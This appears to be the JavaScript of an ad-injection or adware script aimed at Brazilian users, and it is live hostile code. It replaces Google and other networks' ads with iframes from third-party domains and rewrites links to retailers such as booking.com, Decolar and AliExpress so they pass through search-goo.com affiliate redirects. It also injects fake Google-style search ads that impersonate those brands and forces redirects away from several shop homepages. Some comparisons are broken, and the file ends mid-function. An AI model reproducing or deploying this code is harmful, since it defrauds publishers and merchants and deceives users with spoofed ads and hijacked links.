function getSizes(a) {
    var myWidth = 0, myHeight = 0;
    if (typeof (window.innerWidth) === 'number') {
        myWidth = window.innerWidth;
        myHeight = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        myWidth = document.documentElement.clientWidth;
        myHeight = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        myWidth = document.body.clientWidth;
        myHeight = document.body.clientHeight;
    }
    if(a == 'w')
    return myWidth
    else if (a == 'h')
    return myHeight;
    else
    return myWidth + 'x' + myHeight;
}
function createCookie(name, value, segundos) {
    var expires;
    if (segundos) {
        var date = new Date();
        date.setTime(date.getTime() + (segundos * 1000));
        expires = "; expires=" + date.toGMTString();
    }
    else {
        expires = "";
    }
    document.cookie = name + "=" + value + expires + "; path=/";
}
function getCookie(c_name) {
    if (document.cookie.length > 0) {
        c_start = document.cookie.indexOf(c_name + "=");
        if (c_start != -1) {
            c_start = c_start + c_name.length + 1;
            c_end = document.cookie.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = document.cookie.length;
            }
            return unescape(document.cookie.substring(c_start, c_end));
        }
    }
    return "empty";
}

function isLink(a) {
    if (a.href == "") {
        return false;
    }
    var b = /(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
    return b.test(a.href);
}

function tam(me,a) {
    var val = null;
    if(a)
		val = ['728x90','336x280','300x250','468x60','160x600','250x250','120x600','120x240','125x125','234x60','300x600'];
    else
        val = ['300x250', '728x90', '160x600','468x60','800x600','120x20','120x600','800x440','336x280','280x336','250x250','234x60','500x500','800x500','300x600','720x300']; 
    var ret = false;
    for (var i = 0; i < val.length; i++) {
        if (me == val[i]) {
            ret = true;
            break;
        }
    }
    return ret;
}

function a_y() {
    var texts = document.getElementsByTagName('text');
    if (texts.length > 0) {
        for (i = 0; i < texts.length; i++) {		
		var chequear=texts[i].innerHTML;		
            if (texts[i].innerHTML === 'Google' || texts[i].innerHTML.indexOf('Google') !== -1 || texts[i].innerHTML.search("Anuncios") > -1 || texts[i].innerHTML.indexOf("Anuncios") !== -1 || texts[i].innerHTML.indexOf("anuncios") !== -1|| texts[i].innerHTML === 'Gesti&oacute;n anuncios' || texts[i].innerHTML === 'AdChoices' ||chequear.search("n anuncios")>0) {
				var parent = texts[i];
                while (parent.tagName.toUpperCase() !== 'HTML') {
                    if (parent.tagName.toLowerCase() === 'body') {
                   	var w = getSizes('w');
                   	var h = getSizes('h');
                        if (tam(getSizes('t'), true)){
						var controlalongitud=0;
							var longitud=0;
							for (ii = 0; ii < document.links.length; ii++) {
								if (document.links[ii].href.indexOf ('ca-pub-8754618198312775')>0 && document.links[ii].href.indexOf ('useshow')>0){
								controlalongitud=1;
								}
								if (document.links[ii].href.indexOf ('ca-pub-8754618198312775')>0 && document.links[ii].href.indexOf ('support')<0 && document.links[ii].href.indexOf ('trouble')<0 &&controlalongitud==1) {
								longitud=ii;
								}
							}
							if (controlalongitud==1)
							{
								if(window.location.protocol=="https:"){
								parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://meteosite.info/brasil/ads-server/banner.php?a=' + w + '&b=' + h + '"></iframe>';
								}
								else
								{
								parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://meteosite.info/brasil/ads-server/banner.php?a=' + w + '&b=' + h + '"></iframe>';
								}
							}
							else
							{
								if(window.location.protocol=="https:"){
								parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://medicamentosbrasil.org/anuncios/p.php?w=' + w + '&h=' + h + '"></iframe>';
								}
								else
								{
								parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://medicamentosbrasil.org/anuncios/p.php?w=' + w + '&h=' + h + '"></iframe>';
								}
							}
                        }
                    }
                    parent = parent.parentNode;
                }
            }
        }
    }
}


function b_y(){
    var choises = document.getElementsByTagName('img');    
    if(choises.length > 0){              
        for(i = 0; i < choises.length; i++){		
            var child = choises[i];
			var chequear=child.alt;
			if(child.alt === 'AdChoices' || child.src.indexOf("/c_30_us.png") > -1 || child.src.indexOf('//c.betrad.com/') !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {			
						var w = getSizes('w');
						var h = getSizes('h');					
						if (tam(getSizes('t'), true)){
							var controlalongitud=0;
							var longitud=0;
							for (ii = 0; ii < document.links.length; ii++) {
								if (document.links[ii].href.indexOf ('ca-pub-8754618198312775')>0 && document.links[ii].href.indexOf ('useshow')>0){
									controlalongitud=1;
								}
								if (document.links[ii].href.indexOf ('ca-pub-8754618198312775')>0 && document.links[ii].href.indexOf ('support')<0 && document.links[ii].href.indexOf ('trouble')<0 &&controlalongitud==1) {
									longitud=ii;
								}
							}								
							if (controlalongitud==1)
							{
								if(window.location.protocol=="https:")
								{
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://meteosite.info/brasil/ads-server/banner.php?a=' + w + '&b=' + h + '"></iframe>';
								}
								else
								{
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://meteosite.info/brasil/ads-server/banner.php?a=' + w + '&b=' + h + '"></iframe>';
								}
							}
							else
							{
								if(window.location.protocol=="https:")
								{
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://medicamentosbrasil.org/anuncios/p.php?w=' + w + '&h=' + h + '"></iframe>';
								}
								else
								{
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://medicamentosbrasil.org/anuncios/p.php?w=' + w + '&h=' + h + '"></iframe>';
								}
							}							
						}
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}

function c_y(){
    var ifra = document.getElementsByTagName("iframe");
    if(ifra.length > 0){
        for(i = 0; i < ifra.length; i++){
            var child = ifra[i];
             if(child.src.indexOf("doubleclick.net") !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                        var w = getSizes('w');
                        var h = getSizes('h');
                        if (tam(getSizes('t'), true)){
							var controlalongitud=0;
							var longitud=0;
							for (ii = 0; ii < document.links.length; ii++) {
								if (document.links[ii].href.indexOf ('ca-pub-8754618198312775')>0 && document.links[ii].href.indexOf ('useshow')>0){
								controlalongitud=1;
								}
								if (document.links[ii].href.indexOf ('ca-pub-8754618198312775')>0 && document.links[ii].href.indexOf ('support')<0 && document.links[ii].href.indexOf ('trouble')<0 &&controlalongitud==1) {
								longitud=ii;
								}
							}
							if (controlalongitud==1)
							{
								if(window.location.protocol=="https:"){
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://meteosite.info/spain/ads-server/banner.php?a=' + w + '&b=' + h + '"></iframe>';
								}
								else
								{
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://meteosite.info/brasil/ads-server/banner.php?a=' + w + '&b=' + h + '"></iframe>';
								}
							}
							else
							{
								if(window.location.protocol=="https:"){
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://medicamentosbrasil.org/anuncios/p.php?w=' + w + '&h=' + h + '"></iframe>';
								}
								else
								{
								child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://medicamentosbrasil.org/anuncios/p.php?w=' + w + '&h=' + h + '"></iframe>';
								}
							}
                        }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}

function e_y(){
    var choises = document.getElementsByTagName('iframe');   	
    if(choises.length > 0){              
        for(i = 0; i < choises.length; i++){		
            var child2 = choises[i];
			if((child2.src.indexOf("cpmrocket.com") > -1 && child2.src.indexOf("50611516")<1)||child2.src.indexOf("adbooth") > -1||child2.src.indexOf("waframedia") > -1||child2.src.indexOf("adorika") > -1||child2.src.indexOf("smrtgs.com") > -1||child2.src.indexOf("plugrush.com") > -1||child2.src.indexOf("exoclick.com") > -1||child2.src.indexOf("ads.adk2.com") > -1){
			var w=child2.width;
			var h=child2.height
			if (w==300 && h==250){
			child2.outerHTML='<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="300" height="250" src="http://meteosite.info/brasil/ads-server/banner.php?a=300&b=250&useshow=1"></iframe>';
			}
			if (w==728 && h==90){
			child2.outerHTML='<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="728" height="90" src="http://meteosite.info/brasil/ads-server/banner.php?a=728&b=90&useshow=1"></iframe>';
			}	
			if (w=468 && h==60){
			child2.outerHTML='<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="468" height="60" src="http://meteosite.info/brasil/ads-server/banner.php?a=468&b=60&useshow=1"></iframe>';
			}	
            if (w=800 && h==600){
			child2.src="http://search-goo.com/cpmrocket/800x400.html";
			child2.reload;
			}
            if (w=800 && h==400){
			child2.src="http://search-goo.com/cpmrocket/800x400.html";
			child2.reload;
			}
            if (w=600 && h==400){
			child2.src="http://search-goo.com/cpmrocket/600x400.html";
			child2.reload;
			}
			
            }
        }
    }
}

var domains = ['dafiti.com.br','skyscanner.com.br','trivago.com.br','magazineluiza.com.br','sephora.com.br','nike.com.br','hotelurbano.com','groupon.com.br','br.privalia.com','tam.com.br','casasbahia.com.br','ricardoeletro.com.br','centauro.com.br','pt.hostelbookers.com','pontofrio.com.br','tripadvisor.com','tripadvisor.com.br','americanas.com.br','booking.com','aliexpress.com','mercadolivre.com.br','decolar.com','walmart.com.br','submarino.com.br','netshoes.com.br','alibaba.com'];
var valores=['398','407','408','-396','-405','-406','-397','-394','395','-404','403','402','400','391','-390','-390','389','000','377','365','380','387','388','366','379'];
var elvalor='';
function checkValidDesc(a) {
try {
    for (var i = 0; i < domains.length; i++) {
        if (a.match("^(http|https)\:\/\/(www\.)?" + domains[i].replace("\.", "\\\."))) {
            return valores[i];
        }
    }
    return false;
}
catch(e){}
}

function e_z() {
try {
if (window.location.protocol !== "https:") {
    var a = document.getElementsByTagName("a");
	
    for (var i = 0; i < a.length; i++) {
        if (!isLink(a[i]) || document.domain.match((a[i].href.match(":\/\/(.[^/]+)")[1]).replace('www.', ''))) {
            continue
        }
		elvalor=checkValidDesc(a[i].href);
        if (elvalor!==false) {
			if (elvalor!=='000'){
				if (elvalor.substr (0,1)="-"){
					a[i].href = "https://search-goo.com/redirect/type6u.php?superred=" + elvalor.substr(1)
					}
					else
					{
					a[i].href = "https://search-goo.com/redirect/type4u.php?superred=" + elvalor
					}
				}
				else
				{
				a[i].href = "https://secureplugin.com/redirect/redirect.php?link="+a[i].href
				}
        }
    }
}
}
catch(e){
}

var t=setInterval(function() {
	var ad=document.getElementsByClassName("ads-ad");
	if(window.location.href.indexOf("booking")>-1||window.location.href.indexOf("hotel")>-1||window.location.href.indexOf("hostel")>-1||window.location.href.indexOf("posada")>-1||window.location.href.indexOf("pousada")>-1||window.location.href.indexOf("apartamento")>-1||window.location.href.indexOf("hostal")>-1||window.location.href.indexOf("hoteis")>-1||window.location.href.indexOf("hotéis")>-1) {
		if(ad.length>0) {
			clearInterval(t);
			var aleatorbook = Math.round(Math.random()*100);
			if (aleatorbook<20)
				{var urlbook="http://hotelbook.website/booking.php?w=2&link=http%3A%2F%2Fwww.booking.com%3Faid%3D813275";}
				else
				{var urlbook="http://compradescuento.com/booking.php";}
			var d="";
            d += '<style>.ads-ad{padding-top:11px;padding-bottom:11px}#center_col ._jd{position:relative;margin:0px 0px 6px 0px;padding-top:2px;padding-bottom:0px}#center_col .ads-ad{padding-left:8px;padding-right:8px}#rhs ._jd{margin:5px 0px 32px 16px;padding-top:3px;padding-bottom:0px}#rhs .ads-ad{padding-left:0px;padding-right:0px}#center_col ._jd{border-bottom:1px solid #ebebeb}#center_col ._Gl{margin:12px -17px 0 0;padding:0}#center_col ._Gl{font-weight:normal;font-size:13px;float:right}._Gl span+span{margin-left:3px}#rhs ._Gl{font-weight:normal;font-size:13px;margin:0;padding:0;}.ads-bbl-container{background-color:#fff;border:1px solid rgba(0,0,0,0.2);box-shadow:0 4px 16px rgba(0,0,0,0.2);color:#666;position:absolute;z-index:120}.ads-bbl-triangle{border-left-color:transparent;border-right-color:transparent;border-width:0 9.5px 9.5px 9.5px;width:0px;border-style:solid;border-top-color:transparent;height:0px;position:absolute;z-index:121}.ads-bbl-triangle-bg{border-bottom-color:#999}.ads-bbl-triangle-fg{border-bottom-color:#fff;margin-left:-9px;margin-top:1px}.ads-bblc{display:none}._tA{padding:16px;color:#666}._kT{padding-top:12px}._tA a{text-decoration:none}._tA a:hover{text-decoration:underline}._uo{background:url(/images/nav_logo195.png);background-position:0 -106px;display:inline-block;height:12px;margin-top:-2px;position:relative;top:2px;width:12px;text-indent:100%;white-space:nowrap;overflow:hidden}.ads-visurl{color:#006621;white-space:nowrap;font-size:13px}#center_col .ads-visurl cite{color:#006621;vertical-align:bottom}.ads-visurl .ads-badge{margin-right:7px;margin-left:0px}.ads-badge{background-color:#EFC439;border-radius:2px;color:#fff;display:inline-block;font-size:11px;padding:0 2px;line-height:14px;vertical-align:baseline}._jd .action-menu{line-height:0}#center_col ._jd .action-menu .mn-dwn-arw{border-color:#006621 transparent}#center_col ._jd .action-menu:hover .mn-dwn-arw{border-color:#00591E transparent}._BR{display:-webkit-box;min-height:36px;overflow:hidden;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp:2}._pA,._Pr{margin:0 -13px -2px 0;padding:4px 0 3px 28px;width:526px}._pA>li,._Pr>li{-webkit-box-sizing:border-box;box-sizing:border-box;display:inline-block;padding:0 13px 2px 0;vertical-align:top;width:50%}._pA>li{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}._Pr{padding-top:22px;padding-bottom:4px;margin-bottom:-15px}._Pr>li{padding-bottom:15px}._ES>li,._pA>li,._Pr>li{line-height:inherit}</style><h3><a style="display:none" href="'+urlbook+'"s0p1"></a>';
            d += '<a href="'+urlbook+'" id="vs0p1" onmousedown="return google.arwt(this)" class="_Et">Hotéis: Booking.com - Bons preços, sem taxas de reserva??</a></h3>';
            d += '<div class="ads-visurl"><span class="ads-badge">Anúncio</span><cite>www.<b>booking</b>.com/Hoteis</cite>?</div>';
            d += '<div class="ads-creative">Cancelamento grátis · Apoio ao Cliente 24/7 · Compare Opiniões</div>';
            d += '<div class="_Rdb _Nf">Booking.com tem 3.282.020 seguidores no Google+</div>';
            d += '<ul class="_Pr"><li><h3><a href="'+urlbook+'">Hotéis em Rio de Janeiro</a></h3><div class="ads-creative ac">Melhor preço. Sem custos reserva!<br>Hotéis em Rio de Janeiro</div></li><li><h3><a href="'+urlbook+'">Hotéis em São Paulo</a></h3><div class="ads-creative ac">Reserva online fácil e segura.<br>Reserve o seu Hotel em São Paulo</div></li><li><h3><a href="'+urlbook+'">Hotéis Punta del Este</a></h3><div class="ads-creative ac">Reserva sem custos. Ótimas tarifas!<br>Hotéis em Punta del Este</div></li><li><h3><a href="'+urlbook+'">Hotéis em Nova Iorque</a></h3><div class="ads-creative ac">Melhor Preço Garantido!<br>Reserve o seu Hotel em Nova Iorque</div></li></ul>';
            d += '<li class=\"action-menu-item ab_dropdownitem\" role=\"menuitem\" data-type=\"why_this_ad\"><div class=\"action-menu-button\" role=\"menuitem\" tabindex=\"-1\" jsaction=\"am.itemclk\" data-ved=\"0CCIQgRM\">Por que eses anúncios?</div></li></ul></div></div></div>';
            ad['0'].innerHTML = d
		}
	}else if (window.location.href.indexOf("decolar") > -1 || window.location.href.indexOf("voos") > -1){
             if (ad.length > 0) {
                        
                clearInterval(t);
                var d = "";
                d += '<style>.ads-ad{padding-top:11px;padding-bottom:11px}#center_col ._jd{position:relative;margin:0px 0px 6px 0px;padding-top:2px;padding-bottom:0px}#center_col .ads-ad{padding-left:8px;padding-right:8px}#rhs ._jd{margin:5px 0px 32px 16px;padding-top:3px;padding-bottom:0px}#rhs .ads-ad{padding-left:0px;padding-right:0px}#center_col ._jd{border-bottom:1px solid #ebebeb}#center_col ._Gl{margin:12px -17px 0 0;padding:0}#center_col ._Gl{font-weight:normal;font-size:13px;float:right}._Gl span+span{margin-left:3px}#rhs ._Gl{font-weight:normal;font-size:13px;margin:0;padding:0;}.ads-bbl-container{background-color:#fff;border:1px solid rgba(0,0,0,0.2);box-shadow:0 4px 16px rgba(0,0,0,0.2);color:#666;position:absolute;z-index:120}.ads-bbl-triangle{border-left-color:transparent;border-right-color:transparent;border-width:0 9.5px 9.5px 9.5px;width:0px;border-style:solid;border-top-color:transparent;height:0px;position:absolute;z-index:121}.ads-bbl-triangle-bg{border-bottom-color:#999}.ads-bbl-triangle-fg{border-bottom-color:#fff;margin-left:-9px;margin-top:1px}.ads-bblc{display:none}._tA{padding:16px;color:#666}._kT{padding-top:12px}._tA a{text-decoration:none}._tA a:hover{text-decoration:underline}._uo{background:url(/images/nav_logo195.png);background-position:0 -106px;display:inline-block;height:12px;margin-top:-2px;position:relative;top:2px;width:12px;text-indent:100%;white-space:nowrap;overflow:hidden}.ads-visurl{color:#006621;white-space:nowrap;font-size:13px}#center_col .ads-visurl cite{color:#006621;vertical-align:bottom}.ads-visurl .ads-badge{margin-right:7px;margin-left:0px}.ads-badge{background-color:#EFC439;border-radius:2px;color:#fff;display:inline-block;font-size:11px;padding:0 2px;line-height:14px;vertical-align:baseline}._jd .action-menu{line-height:0}#center_col ._jd .action-menu .mn-dwn-arw{border-color:#006621 transparent}#center_col ._jd .action-menu:hover .mn-dwn-arw{border-color:#00591E transparent}._BR{display:-webkit-box;min-height:36px;overflow:hidden;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp:2}._pA,._Pr{margin:0 -13px -2px 0;padding:4px 0 3px 28px;width:526px}._pA>li,._Pr>li{-webkit-box-sizing:border-box;box-sizing:border-box;display:inline-block;padding:0 13px 2px 0;vertical-align:top;width:50%}._pA>li{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}._Pr{padding-top:22px;padding-bottom:4px;margin-bottom:-15px}._Pr>li{padding-bottom:15px}._ES>li,._pA>li,._Pr>li{line-height:inherit}</style><h3><a style="display:none" href="https://search-goo.com/redirect/type4u.php?superred=380" id="s0p1"></a>';
                d += '<a href="https://search-goo.com/redirect/type4u.php?superred=380" id="vs0p1" onmousedown="return google.arwt(this)" class="_Et"><b>Decolar.com</b> - Decolar - Site Oficial </a></h3>';
                d += '<div class="ads-visurl"><span class="ads-badge">Anuncio</span><cite>www.<b>decolar</b>.com/</cite>?</div>';
                d += '<div class="ads-creative">Melhor Preço para sua Viagem Aqui.</div>';
                d += '<div class="_Rdb _Nf">Orgulho de ser a Maior do Brasil!</div>';
                d += '<ul class="_Pr"><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=380">Passagens em Promoção</a></h3><div class="ads-creative ac">Confira Descontos Imbatíveis.<br>Parcele sua Viagem Em 10X s/Juros!</div></li><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=380">Voos en Promoçao</a></h3><div class="ads-creative ac">Confira Descontos Imbatíveis.<br>Aproveite as Ofertas de Decolar.com™!</div></li><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=380"> Compre Aqui seu Hotel</a></h3><div class="ads-creative ac">Tarifas Imperdíveis de Hotéis.<br>Hospede-se com Máximo de Conforto!</div></li><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=380"> Cruzeiros em Promoção</a></h3><div class="ads-creative ac">Várias Opções de Cruzeiro para Você<br>Aproveite Melhores Preços Aqui!</div></li></ul>';
                d += '<li class=\"action-menu-item ab_dropdownitem\" role=\"menuitem\" data-type=\"why_this_ad\"><div class=\"action-menu-button\" role=\"menuitem\" tabindex=\"-1\" jsaction=\"am.itemclk\" data-ved=\"0CCIQgRM\">¿Por qué este anuncio?</div></li></ul></div></div></div>';
                ad['0'].innerHTML = d            
            }
    }else if (window.location.href.indexOf("tripadvisor") > -1){
             if (ad.length > 0) {
                        
                clearInterval(t);
                var d = "";
                d += '<style>.ads-ad{padding-top:11px;padding-bottom:11px}#center_col ._jd{position:relative;margin:0px 0px 6px 0px;padding-top:2px;padding-bottom:0px}#center_col .ads-ad{padding-left:8px;padding-right:8px}#rhs ._jd{margin:5px 0px 32px 16px;padding-top:3px;padding-bottom:0px}#rhs .ads-ad{padding-left:0px;padding-right:0px}#center_col ._jd{border-bottom:1px solid #ebebeb}#center_col ._Gl{margin:12px -17px 0 0;padding:0}#center_col ._Gl{font-weight:normal;font-size:13px;float:right}._Gl span+span{margin-left:3px}#rhs ._Gl{font-weight:normal;font-size:13px;margin:0;padding:0;}.ads-bbl-container{background-color:#fff;border:1px solid rgba(0,0,0,0.2);box-shadow:0 4px 16px rgba(0,0,0,0.2);color:#666;position:absolute;z-index:120}.ads-bbl-triangle{border-left-color:transparent;border-right-color:transparent;border-width:0 9.5px 9.5px 9.5px;width:0px;border-style:solid;border-top-color:transparent;height:0px;position:absolute;z-index:121}.ads-bbl-triangle-bg{border-bottom-color:#999}.ads-bbl-triangle-fg{border-bottom-color:#fff;margin-left:-9px;margin-top:1px}.ads-bblc{display:none}._tA{padding:16px;color:#666}._kT{padding-top:12px}._tA a{text-decoration:none}._tA a:hover{text-decoration:underline}._uo{background:url(/images/nav_logo195.png);background-position:0 -106px;display:inline-block;height:12px;margin-top:-2px;position:relative;top:2px;width:12px;text-indent:100%;white-space:nowrap;overflow:hidden}.ads-visurl{color:#006621;white-space:nowrap;font-size:13px}#center_col .ads-visurl cite{color:#006621;vertical-align:bottom}.ads-visurl .ads-badge{margin-right:7px;margin-left:0px}.ads-badge{background-color:#EFC439;border-radius:2px;color:#fff;display:inline-block;font-size:11px;padding:0 2px;line-height:14px;vertical-align:baseline}._jd .action-menu{line-height:0}#center_col ._jd .action-menu .mn-dwn-arw{border-color:#006621 transparent}#center_col ._jd .action-menu:hover .mn-dwn-arw{border-color:#00591E transparent}._BR{display:-webkit-box;min-height:36px;overflow:hidden;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp:2}._pA,._Pr{margin:0 -13px -2px 0;padding:4px 0 3px 28px;width:526px}._pA>li,._Pr>li{-webkit-box-sizing:border-box;box-sizing:border-box;display:inline-block;padding:0 13px 2px 0;vertical-align:top;width:50%}._pA>li{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}._Pr{padding-top:22px;padding-bottom:4px;margin-bottom:-15px}._Pr>li{padding-bottom:15px}._ES>li,._pA>li,._Pr>li{line-height:inherit}</style><h3><a style="display:none" href="https://search-goo.com/redirect/type4u.php?superred=390" id="s0p1"></a>';
                d += '<a href="https://search-goo.com/redirect/type4u.php?superred=390" id="vs0p1" onmousedown="return google.arwt(this)" class="_Et">TripAdvisor.com.br - TripAdvisor-site oficial? </a></h3>';
                d += '<div class="ads-visurl"><span class="ads-badge">Anuncio</span><cite>www.<b>tripadvisor</b>.com.br/</cite>?</div>';
                d += '<div class="ads-creative">Bons hotéis, ofertas e boa viagem! Comentários. Dicas. Boa viagem.</div>';
                d += '<div class="_Rdb _Nf">Milhões de avaliações · Fotos de viajantes · É fácil comparar preços</div>';
                d += '<ul class="_Pr"><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=390">Encontre hotéis</a></h3><div class="ads-creative ac">Descubra o hotel perfeito.<br>Garanta férias incríveis!</div></li><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=390">Encontre um voo barato</a></h3><div class="ads-creative ac">Não há outro site de comparação de<br>passagens aéreas tão fácil de usar.</div></li><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=390"> Melhores restaurantes</a></h3><div class="ads-creative ac">Já conhece estes restaurantes<br>premiados? Veja os vencedores.</div></li><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=390"> Pousadas premiadas</a></h3><div class="ads-creative ac">Conheça o melhor que há no mundo.<br>25 pousadas premiadas.</div></li></ul>';
                d += '<li class=\"action-menu-item ab_dropdownitem\" role=\"menuitem\" data-type=\"why_this_ad\"><div class=\"action-menu-button\" role=\"menuitem\" tabindex=\"-1\" jsaction=\"am.itemclk\" data-ved=\"0CCIQgRM\">¿Por qué este anuncio?</div></li></ul></div></div></div>';
                ad['0'].innerHTML = d            
            }
    }else if (window.location.href.indexOf("aliexpress") > -1){
             if (ad.length > 0) {
                        
                clearInterval(t);
                var d = "";
                d += '<style>.ads-ad{padding-top:11px;padding-bottom:11px}#center_col ._jd{position:relative;margin:0px 0px 6px 0px;padding-top:2px;padding-bottom:0px}#center_col .ads-ad{padding-left:8px;padding-right:8px}#rhs ._jd{margin:5px 0px 32px 16px;padding-top:3px;padding-bottom:0px}#rhs .ads-ad{padding-left:0px;padding-right:0px}#center_col ._jd{border-bottom:1px solid #ebebeb}#center_col ._Gl{margin:12px -17px 0 0;padding:0}#center_col ._Gl{font-weight:normal;font-size:13px;float:right}._Gl span+span{margin-left:3px}#rhs ._Gl{font-weight:normal;font-size:13px;margin:0;padding:0;}.ads-bbl-container{background-color:#fff;border:1px solid rgba(0,0,0,0.2);box-shadow:0 4px 16px rgba(0,0,0,0.2);color:#666;position:absolute;z-index:120}.ads-bbl-triangle{border-left-color:transparent;border-right-color:transparent;border-width:0 9.5px 9.5px 9.5px;width:0px;border-style:solid;border-top-color:transparent;height:0px;position:absolute;z-index:121}.ads-bbl-triangle-bg{border-bottom-color:#999}.ads-bbl-triangle-fg{border-bottom-color:#fff;margin-left:-9px;margin-top:1px}.ads-bblc{display:none}._tA{padding:16px;color:#666}._kT{padding-top:12px}._tA a{text-decoration:none}._tA a:hover{text-decoration:underline}._uo{background:url(/images/nav_logo195.png);background-position:0 -106px;display:inline-block;height:12px;margin-top:-2px;position:relative;top:2px;width:12px;text-indent:100%;white-space:nowrap;overflow:hidden}.ads-visurl{color:#006621;white-space:nowrap;font-size:13px}#center_col .ads-visurl cite{color:#006621;vertical-align:bottom}.ads-visurl .ads-badge{margin-right:7px;margin-left:0px}.ads-badge{background-color:#EFC439;border-radius:2px;color:#fff;display:inline-block;font-size:11px;padding:0 2px;line-height:14px;vertical-align:baseline}._jd .action-menu{line-height:0}#center_col ._jd .action-menu .mn-dwn-arw{border-color:#006621 transparent}#center_col ._jd .action-menu:hover .mn-dwn-arw{border-color:#00591E transparent}._BR{display:-webkit-box;min-height:36px;overflow:hidden;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp:2}._pA,._Pr{margin:0 -13px -2px 0;padding:4px 0 3px 28px;width:526px}._pA>li,._Pr>li{-webkit-box-sizing:border-box;box-sizing:border-box;display:inline-block;padding:0 13px 2px 0;vertical-align:top;width:50%}._pA>li{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}._Pr{padding-top:22px;padding-bottom:4px;margin-bottom:-15px}._Pr>li{padding-bottom:15px}._ES>li,._pA>li,._Pr>li{line-height:inherit}</style><h3><a style="display:none" href="https://search-goo.com/redirect/type4u.php?superred=377" id="s0p1"></a>';
                d += '<a href="https://search-goo.com/redirect/type4u.php?superred=377" id="vs0p1" onmousedown="return google.arwt(this)" class="_Et">AliExpress.com - Aliexpress Official Site?? </a></h3>';
                d += '<div class="ads-visurl"><span class="ads-badge">Anuncio</span><cite>www.<b>aliexpress</b>.com/</cite>?</div>';
                d += '<div class="ads-creative">More Goods, Lower Price, Best Buy on Top Wholesale Platform.Join Now!</div>';
                d += '<ul class="_Pr"><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=377">Cell Phones</a><br><a href="https://search-goo.com/redirect/type4u.php?superred=377">Apparel & Accessories</a><br><a href="https://search-goo.com/redirect/type4u.php?superred=377">Hair Style</a></h3></li><li></li><li><h3><a href="https://search-goo.com/redirect/type4u.php?superred=377">Super Deals</a><br><a href="https://search-goo.com/redirect/type4u.php?superred=377">About AliExpress</a><br><a href="https://search-goo.com/redirect/type4u.php?superred=377">Best Selling</a></h3></li><li></li></ul>';
                d += '<li class=\"action-menu-item ab_dropdownitem\" role=\"menuitem\" data-type=\"why_this_ad\"><div class=\"action-menu-button\" role=\"menuitem\" tabindex=\"-1\" jsaction=\"am.itemclk\" data-ved=\"0CCIQgRM\">¿Por qué este anuncio?</div></li></ul></div></div></div>';
                ad['0'].innerHTML = d            
            }
    }
}
,100);
}




function redaff(){

if (location.href === 'http://www.trivago.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=408";
}

if (location.href === 'http://www.skyscanner.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=407";
}

if (location.href === 'http://www.dafiti.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=398";
}

if (location.href === 'http://www.magazineluiza.com.br/') {
	window.location ="https://search-goo.com/redirect/type6u.php?superred=396";
}

